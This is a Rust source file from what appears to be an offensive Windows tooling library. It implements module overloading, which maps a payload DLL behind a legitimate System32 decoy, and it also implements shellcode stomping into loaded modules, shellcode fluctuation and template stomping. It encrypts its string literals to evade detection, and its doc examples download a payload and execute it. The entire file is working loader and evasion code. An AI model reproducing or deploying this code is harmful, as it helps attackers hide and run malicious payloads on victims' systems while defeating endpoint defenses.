#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{cell::UnsafeCell, env, ffi::c_void, fs, mem::size_of, path::Path, ptr::{self, copy_nonoverlapping}};
use nanorand::{BufferedRng, Rng, WyRand};
use windows::Win32::{Foundation::HANDLE, System::SystemServices::IMAGE_BASE_RELOCATION};
use data::{PeMetadata, PVOID, PAGE_READWRITE, PeManualMap, PAGE_EXECUTE_READ};
use winproc::Process;

fn find_suitable_module(function_size: u32) -> usize
{
    let process = Process::current();
    let modules = process.module_list().unwrap();
    let mut suitable_text_sections: Vec<usize> = vec![];
    for m in modules
    {
        let module_base_address = m.handle() as usize;
        let offset = is_suitable(function_size, module_base_address);
        if offset != 0 && !m.name().unwrap().contains(".exe") {
            return module_base_address + offset as usize;
        }
        
        let module_metadata = manualmap::get_pe_metadata(module_base_address as *const u8, false);
        if module_metadata.is_ok()
        {
            let pe_metadata = module_metadata.unwrap();
            for section in pe_metadata.sections
            {   
                let s = std::str::from_utf8(&section.Name).unwrap();
                if s.contains(".text") 
                {
                    unsafe
                    {
                        if section.Misc.VirtualSize > function_size {
                            suitable_text_sections.push(module_base_address);
                        }
                    }
                }
            }
        }    
    }

    if suitable_text_sections.len() > 0 {
        return suitable_text_sections[0];
    }

    0
}

fn is_suitable(function_size: u32, module_base_address: usize) -> u32
{
    unsafe
    {
        let exception_directory = manualmap::get_runtime_table(module_base_address as *mut _);
        let mut rt = exception_directory.0;
        if rt == ptr::null_mut() {
            return 0;
        }
        
        let items = exception_directory.1 / 12;
        let mut count = 0;
        while count < items
        {   
            let runtime_function = *rt;
            let size = runtime_function.end_addr - runtime_function.begin_addr;
            if size > function_size {
                return runtime_function.begin_addr;
            }
    
            rt = rt.add(1);
            count += 1;
        }
    }
    
    0
}

/// Locate a legitimate module of certain minimun size.
/// 
/// It will return the path of the selected module or an empty string in case 
/// that it fails to find a suitable module.
pub fn find_decoy_module (min_size: i64) -> String
{

    let directory_path =  format!("{}\\{}",env::var("WINDIR").unwrap(), "System32");
    let mut files:Vec<String> = vec![];
    for entry in fs::read_dir(directory_path).unwrap()
    {
        let p = entry.unwrap();
        let path = p.path();

        if !path.is_dir() &&  path.to_str().unwrap().ends_with(".dll")
        {
            let slice:Vec<String> = path.to_str().unwrap().to_string().split("\\").map(str::to_string).collect();
            files.push(slice[slice.len() - 1].to_string());
        }
    }

    let process = Process::current();
    let modules = process.module_list().unwrap();
    let mut remove: Vec<i32> = vec![];
    for m in modules
    {   
        let mut c = 0;
        for f in &files
        {
            if f.to_lowercase() == m.name().unwrap().to_lowercase() {
                remove.push(c);
            }
            c = c + 1;
        }
    }

    for r in remove {
        files.remove(r as usize);
    }

    let mut rng = WyRand::new();
    while files.len() > 0
    {
        let windir = &lc!("WINDIR");
        let sys32 = &lc!("System32");
        let r = rng.generate_range(0..files.len());
        let windir = std::env::var(windir).unwrap();
        let path =  format!("{}\\{}\\{}", windir, sys32, &files[r]);
        let size = fs::metadata(&path).unwrap().len() as i64;
        if size > (min_size * 2) {
            return path;
        }
        else {
            files.remove(r);
        }
    }

    "".to_string()
} 

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,usize), String>
{

    if !Path::new(payload_path).is_file() {
        return Err(lc!("[x] Payload file not found."));
    }


    let mut file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = overload_module(&file_content, decoy_module_path)?;
    let file_content_ptr = file_content.as_mut_ptr();
    
    unsafe 
    {
        for i in 0..file_content.len() {
            *(file_content_ptr.add(i)) = 0u8;
        }
    }

    Ok(result)
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,usize), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file() {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        let decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len() {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }
    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == "" {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,usize) = overload_to_section(file_content, decoy_metadata.0)?;

        Ok(result)
}

/// Load a payload from memory to an existing memory section.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let section_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section("c:\\windows\\system32\\signedmodule.dll")?;
/// let module: (PeMetadata,i64) = overload_to_section(payload_content, section_metadata.0)?;
/// 
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,usize), String>
{
    unsafe
    {
        let region_size: usize;
        if section_metadata.pe_info.is_32_bit {
            region_size = section_metadata.pe_info.opt_header_32.SizeOfImage as usize;
        }
        else {
            region_size = section_metadata.pe_info.opt_header_64.size_of_image as usize;
        }

        let size: *mut usize = std::mem::transmute(&region_size);
        let base_address: *mut PVOID = std::mem::transmute(&section_metadata.base_address);
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let r = dinvoke::nt_protect_virtual_memory(
            HANDLE { 0: -1}, 
            base_address, 
            size, 
            PAGE_READWRITE, 
            old_protection
        );

        if r != 0 {
            return Err(lc!("[x] Error changing memory protection."));
        }
        
        dinvoke::rtl_zero_memory(*base_address, region_size);
        
        let module_ptr: *const u8 = std::mem::transmute(file_content.as_ptr());
        let pe_info = manualmap::get_pe_metadata(module_ptr, false)?;
        
        manualmap::map_module_to_memory(module_ptr, *base_address, &pe_info)?;
        manualmap::relocate_module(&pe_info, *base_address);
        manualmap::rewrite_module_iat(&pe_info, *base_address)?;
        manualmap::set_module_section_permissions(&pe_info, *base_address)?;

        Ok((pe_info, *base_address as usize))
    }
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair ((Vec<u8>,Vec<u8>),i64) containing the mapped PE's (payload)
/// content, the decoy module's content and the payload's base address or a string with a descriptive error messsage.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),usize), String>
{

    if !Path::new(payload_path).is_file() {
        return Err(lc!("[x] Payload file not found."));
    }

    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = managed_overload_module(file_content.clone(), decoy_module_path)?;

    Ok(((file_content, result.0), result.1))
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (Vec<u8>,i64) containing the decoy content and the payload base address or a string
/// with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,usize), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    let decoy_content;
    
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file() {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len() {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }
    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == "" {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,usize) = overload_to_section(&file_content, decoy_metadata.0)?;

        Ok((decoy_content, result.1))
}

/// Stomp a shellcode on a loaded module.
/// The first parameter of this function is the shellcode's content. The next two parameters modify the behaviour of the function.
/// 
/// The stomp_address parameter can be used to indicate where the shellcode should be written to. If this parameter is non zero, the function
/// will try to stomp the shellcode in that particular address. 
/// The module_base_address parameter can be used to point to the memory base address of a dll where this function should look for a suitable spot
/// to stomp the shellcode to. If this parameter is non zero, the function will try to locate a big enough function inside that specific dll to stomp the shellcode to it.
/// 
/// If stomp_address and module_base_address are both zero the function will iterate over all loaded module and will try to find a suitable region to stomp the shellcode to it.
/// 
/// This function returns either a pair (Vec<u8>,i64) containing the legitimate content of the region where the shellcode has been stomped to and the address where it has been written to or a string
/// with a descriptive error message.
/// 
/// # Examples
/// ## Stomp the shellcode on a specific address
///
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let my_big_enough_function = dinvoke::get_function_address(my_dll, "my_function");
/// let module = overload::managed_module_stomping(&payload_content, my_big_enough_function, 0);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Look for a suitable function inside a specific dll and stomp the shellcode there
///
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let module = overload::managed_module_stomping(&payload_content, 0, my_dll);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Look for a suitable function inside any loaded dll and stomp the shellcode there
///
/// ```
/// let payload_content = download_function();
/// let module = overload::managed_module_stomping(&payload_content, 0, 0);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Module stomping + shellcode fluctuation
/// 
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let overload = overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
/// let mut manager = dmanager::Manager::new();
/// let _r = manager.new_shellcode(overload.1, payload_content, overload.0).unwrap(); // The manager will take care of the fluctuation process
/// let _r = manager.hide_shellcode(overload.1).unwrap(); // We restore the memory's original content and hide our shellcode
/// ... 
/// let _r = manager.stomp_shellcode(overload.1).unwrap(); // When we need our shellcode's functionality, we restomp it to the same location so we can execute it
/// let run: unsafe extern "system" fn () = std::mem::transmute(overload.1);
/// run();
/// let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
/// ```
pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usize, module_base_address: usize) -> Result<(Vec<u8>,usize), String>
{
    unsafe
    {
        let process_handle = HANDLE(-1);
        let size = payload_content.len() as u32;
        if size == 0
        {
            return Err(lc!("[x] Invalid payload."));
        }

        if stomp_address == 0
        {
            if module_base_address != 0
            {
                let offset = is_suitable(size, module_base_address);
                if offset != 0 {
                    stomp_address = module_base_address + offset as usize;
                }
                else {
                    return Err(lc!("[x] The selected module is not valid to stomp the payload."));
                }
            }
            else {
                stomp_address = find_suitable_module(size);
            }

            if stomp_address == 0 {
                return Err(lc!("[x] Failed to find suitable module to stomp to."));
            }
        }
        
        let stomp_address_clone = stomp_address;
        let real_content = vec![0u8; size as usize];
        let buffer = std::mem::transmute(real_content.as_ptr());
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            process_handle, 
            stomp_address_clone as *mut _, 
            buffer, 
            size as usize, 
            bytes_written
        );

        if ret != 0 {
            return Err(lc!("[x] Memory read failed."));
        } 

        let base_address: *mut PVOID = std::mem::transmute(&stomp_address_clone);
        let s = size as usize;
        let s: *mut usize = std::mem::transmute(&s);
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);
        let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_READWRITE, old_protection);

        if ret != 0 {
            return Err(lc!("[x] Error changing memory permissions."));
        }

        let buffer: *mut c_void = std::mem::transmute(payload_content.as_ptr());
        let written: usize = 0;
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret_write = dinvoke::nt_write_virtual_memory(process_handle, stomp_address as *mut _, buffer, size as usize, bytes_written);

        let base_address: *mut PVOID = std::mem::transmute(&stomp_address_clone);
        let s = size as usize;
        let s: *mut usize = std::mem::transmute(&s);
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);
        let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_EXECUTE_READ, old_protection);

        if ret_write != 0 {
            return Err(lc!("[x] Payload writing failed."));
        }

        if ret != 0 {
            return Err(lc!("[x] Could not restore memory permissions."));
        }

        Ok((real_content,stomp_address)) 
    }
}

/// Generates a template from a given DLL file by extracting the content of the `.text` section
/// and replacing it with arbitrary content. This function stores both the template and the
/// extracted content of the `.text` section in separate files in a specified output directory.
///
/// # Arguments
///
/// * `dll_path` - A path to the DLL file from which to generate the template.
/// * `output_dir` - The path to the output directory where the template and the extracted `.text`
///   section content will be written.The path must end with a backslash (`\`) for this function to work properly.
///
/// # Returns
///
/// Returns `Ok(())` if the template generation is successful. If an error occurs during the process,
/// returns `Err(String)` with a description of the error.
///
/// # Examples
///
/// ```
///
/// fn main() {
///     let dll_path = r"C:\Path\To\dll.dll";
///     let output_dir = r"C:\Path\To\OutputDirectory\";
///     match overload::generate_template(dll_path, output_dir) {
///         Ok(()) => println!("Template generated successfully."),
///         Err(e) => println!("Failed to generate template: {}", e),
///     }
/// }
/// ```
pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(), String>
{
    unsafe
    {
        let text_name = &lc!(".text");
        if !Path::new(input_file).is_file() || !Path::new(output_directory).is_dir() {
            return Err(lc!("[x] Invalid path."));
        }

        let mapped_dll = dinvoke::load_library_a(input_file);
        if mapped_dll == 0 {
            return Err(lc!("[x] Invalid input dll."));
        }

        let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _, false).unwrap();
        let entry_point;
        if mapped_dll_metadata.is_32_bit 
        {
           entry_point = mapped_dll + mapped_dll_metadata.opt_header_32.AddressOfEntryPoint as usize;
        }
        else 
        {
           entry_point = mapped_dll + mapped_dll_metadata.opt_header_64.address_of_entry_point as usize;
  
        }

        let mut tls_callback_vas: Vec<usize> = vec![]; 
        if mapped_dll_metadata.opt_header_64.number_of_rva_and_sizes >= 10
        {
            let address: *mut u8 = (mapped_dll  + mapped_dll_metadata.opt_header_64.datas_directory[9].VirtualAddress as usize) as *mut u8;
            let address_of_tls_callback = address.add(24) as *mut usize;
            let mut address_of_tls_callback_array: *mut usize = std::mem::transmute(*address_of_tls_callback);
            
            while *address_of_tls_callback_array != 0
            {
                tls_callback_vas.push(*address_of_tls_callback_array);
                address_of_tls_callback_array = address_of_tls_callback_array.add(1);
            }
        }
          
        // We calculate entrypoint/tls callbacks' RVAs from .text section's base address
        let mut entrypoint_rva: u32 = 0;
        let mut tls_callbacks_rvas: Vec<u32> = vec![];
        for section in &mapped_dll_metadata.sections
        {
           if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
           {
              let text_base_address = mapped_dll as usize + section.VirtualAddress as usize;
              entrypoint_rva = (entry_point as usize - text_base_address) as u32;
  
              for tls_callback_va in &tls_callback_vas
              {
                  let tls_rva = (tls_callback_va - text_base_address) as u32;
                  tls_callbacks_rvas.push(tls_rva);
              }

              break;
           }
        }
  
        let dll_content = fs::read(input_file).expect(&lc!("[x] Error opening the specified dll."));
        
        let dll_content_buffer = dll_content.as_ptr() as _;
        let pe_info = manualmap::get_pe_metadata(dll_content_buffer, false).unwrap();
  
        for section in &pe_info.sections
        {
            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
            {
                let text_base_address: *mut c_void = (dll_content_buffer as usize + section.PointerToRawData as usize) as *mut c_void;
                let size: usize = section.SizeOfRawData as usize;
                let u = size / 4;
                let mut text_content: Vec<u8> = vec![0;size];

                // We do this to reduce the template's entropy
                let mut first_buffer: Vec<u8> = vec![0;u*3];
                let mut second_buffer: Vec<u8> = vec![0;u];
                let mut rng = BufferedRng::new(WyRand::new());
                rng.fill(&mut first_buffer);
                first_buffer.append(&mut second_buffer);

                copy_nonoverlapping(text_base_address as *mut u8, text_content.as_mut_ptr(), size);
                
                let payload_path = format!("{}{}",output_directory, lc!("payload.bin"));
                let path: &Path = Path::new(&payload_path);
                let _ = fs::write(path, &text_content);

                let text_base_address: *mut c_void = (dll_content_buffer as usize + section.PointerToRawData as usize) as *mut c_void;
                let size: usize = section.SizeOfRawData as usize;                
                copy_nonoverlapping(first_buffer.as_ptr() as *const u8, text_base_address as *mut u8, size);

                let dll_main_template = 214404767416760u64; // mov eax, 1; ret; replaces Dll's entrypoint
                let entrypoint_addr = (dll_content_buffer as usize + section.PointerToRawData as usize + entrypoint_rva as usize) as *mut u64;
                *entrypoint_addr = dll_main_template;

                let callback_template = 0xc3 as u8; // Just a ret; instruction to replace Tls Callbacks
                for tls_callbacks_rva in tls_callbacks_rvas
                {
                    let tls_callback_addr = (dll_content_buffer as usize + section.PointerToRawData as usize + tls_callbacks_rva as usize) as *mut u8;
                    *tls_callback_addr = callback_template;
                }

                let template_path = format!("{}{}",output_directory, lc!("template.dll"));
                let _ = fs::write(&template_path, &dll_content);
                
                break;
            }
        }

        Ok(())
    }
}

/// Performs template stomping by loading a template from disk and injecting a given payload
/// into the `.text` section of the loaded template, handling relocations appropriately.
///
/// # Arguments
///
/// * `template_path` - The path to the DLL template file on disk.
/// * `payload` - A mutable reference to a vector of bytes (`Vec<u8>`) that will be "stomped" into
///   the `.text` section of the loaded template.
///
/// # Returns
///
/// Returns a tuple `(PeMetadata, isize)` upon successful completion, where `PeMetadata` contains
/// the metadata of the stomped DLL, and `isize` represents the base memory address of the loaded
/// DLL. If the stomping process fails, it returns an `Err(String)` containing a detailed error message.
///
/// # Examples
///
/// ```
/// fn main() {
///     let template_path = r"C:\path\to\template.dll";
///     let mut payload: Vec<u8> = download_function();
///     match overload::template_stomping(template_path, &mut payload) {
///         Ok((metadata, base_address)) => {
///             println!("Template stomping successful. Dll's base address: {:x}", base_address);
///         },
///         Err(e) => {
///             println!("Failed to stomp template: {}", e);
///         }
///     }
/// }
/// ```
pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> Result<(PeMetadata,usize), String>
{
    unsafe
    {
        let text_name = &lc!(".text");
        if !Path::new(template_path).is_file() {
            return Err(lc!("[x] Invalid dll path."));
        }

        let loaded_dll = dinvoke::load_library_a(template_path);
        if loaded_dll == 0 {
            return Err(lc!("[x] Error calling LoadLibraryA."));
        }

        let dll_metadata = manualmap::get_pe_metadata(loaded_dll as _, false).unwrap();
        for section in &dll_metadata.sections
        {
            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
            {
                let text_address: *mut c_void = (loaded_dll as usize + section.VirtualAddress as usize) as *mut c_void;
                let text_sect_ending_addr = loaded_dll as usize + section.VirtualAddress as usize + section.Misc.VirtualSize as usize;
                let text_addr_ptr: *mut PVOID = std::mem::transmute(&text_address);
                let s: UnsafeCell<isize> = isize::default().into();
                let size: *mut usize = std::mem::transmute(s.get());
                *size = section.Misc.VirtualSize as usize;
                let o = u32::default();
                let old_protection: *mut u32 = std::mem::transmute(&o);
                let new_protect: u32 = PAGE_READWRITE;

                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);

                if ret != 0
                {
                    let _ = dinvoke::free_library(loaded_dll as isize);
                    return Err(lc!("[x] An error ocurred. Dll released."));
                }

                let handle = HANDLE(-1);
                let written: usize = 0;
                let nsize = payload_content.len();
                let buffer: *mut c_void = payload_content.as_mut_ptr() as _;
                let bytes_written: *mut usize = std::mem::transmute(&written);
                let ret = dinvoke::nt_write_virtual_memory(handle, text_address, buffer, nsize, bytes_written);
                if ret != 0
                {
                    let _ = dinvoke::free_library(loaded_dll as isize);
                    return Err(lc!("[x] An error ocurred. Dll released."));
                }

                relocate_text_section(&dll_metadata, loaded_dll as _, text_address as _,text_sect_ending_addr);

                let text_address: *mut c_void = (loaded_dll as usize + section.VirtualAddress as usize) as *mut c_void;
                let text_addr_ptr: *mut PVOID = std::mem::transmute(&text_address);
                let s: UnsafeCell<isize> = isize::default().into();
                let size: *mut usize = std::mem::transmute(s.get());
                *size = section.Misc.VirtualSize as usize;
                let o = u32::default();
                let old_protection: *mut u32 = std::mem::transmute(&o);
                let new_protect: u32 = PAGE_EXECUTE_READ;
                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
                if ret != 0
                {
                    let _ = dinvoke::free_library(loaded_dll as isize);
                    return Err(lc!("[x] An error ocurred. Dll released."));
                }

                return Ok((dll_metadata,loaded_dll));
            }
        }

        Ok((PeMetadata::default(),0))

    }
}

/// Performs all relocations on the .text section of a loaded module.
///
/// The parameters required are the module's metadata information and a
/// pointer to the base address where the module is mapped in memory.
fn relocate_text_section(pe_info: &PeMetadata, image_ptr: *mut c_void, start_address: usize, end_address: usize) 
{
    unsafe {

        let module_memory_base: *mut usize = std::mem::transmute(image_ptr);
        let image_data_directory;
        let image_delta: isize;
        if pe_info.is_32_bit 
        {
            image_data_directory = pe_info.opt_header_32.DataDirectory[5]; // BaseRelocationTable
            image_delta = module_memory_base as isize - pe_info.opt_header_32.ImageBase as isize;
        }
        else 
        {
            image_data_directory = pe_info.opt_header_64.datas_directory[5]; // BaseRelocationTable
            image_delta = module_memory_base as isize - pe_info.opt_header_64.image_base as isize;
        }

        let mut reloc_table_ptr = (module_memory_base as usize + image_data_directory.VirtualAddress as usize) as *mut i32;
        let mut next_reloc_table_block = -1;

        while next_reloc_table_block != 0 
        {
            let ibr: *mut IMAGE_BASE_RELOCATION = std::mem::transmute(reloc_table_ptr);
            let image_base_relocation = *ibr;
            let reloc_count: isize = (image_base_relocation.SizeOfBlock as isize - size_of::<IMAGE_BASE_RELOCATION>() as isize) / 2;

            for i in 0..reloc_count
            {
                let reloc_entry_ptr = (reloc_table_ptr as usize + size_of::<IMAGE_BASE_RELOCATION>() as usize + (i * 2) as usize) as *mut u16;
                let reloc_value = *reloc_entry_ptr;

                let reloc_type = reloc_value >> 12;
                let reloc_patch = reloc_value & 0xfff;

                if reloc_type != 0
                {
                    
                    if reloc_type == 0x3
                    {
                        let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut i32;
                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 4)
                        {
                            let original_ptr = *patch_ptr;
                            let patch = original_ptr + image_delta as i32;
                            *patch_ptr = patch;
                        }
                        
                    }
                    else 
                    {
                        let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut isize;
                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 8)
                        {
                            let original_ptr = *patch_ptr;
                            let patch = original_ptr + image_delta as isize;
                            *patch_ptr = patch;
                        }
                    }
                }
            }

            reloc_table_ptr = (reloc_table_ptr as usize + image_base_relocation.SizeOfBlock as usize) as *mut i32;
            next_reloc_table_block = *reloc_table_ptr;

        }
    }
}